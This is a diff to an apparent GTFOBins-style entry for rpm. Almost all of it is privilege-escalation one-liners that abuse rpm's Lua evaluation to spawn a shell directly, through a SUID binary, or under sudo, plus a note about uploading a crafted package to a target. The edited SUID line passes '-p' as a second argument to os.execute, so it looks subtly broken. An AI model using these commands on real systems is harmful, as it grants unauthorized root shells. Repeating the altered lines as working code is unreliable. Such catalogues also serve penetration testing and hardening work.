@@ -1,11 +1,11 @@
 ---
 functions:
   shell:
-    - code: rpm --eval '%{lua:posix.exec("/bin/sh")}'
+    - code: rpm --eval '%{lua:os.execute("/bin/sh")}'
   suid:
-    - code: ./rpm --eval '%{lua:posix.exec("/bin/sh", "-p")}'
+    - code: ./rpm --eval '%{lua:os.execute("/bin/sh", "-p")}'
   sudo:
-    - code: sudo rpm --eval '%{lua:posix.exec("/bin/sh")}'
+    - code: sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
     - description: |
         It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
         ```
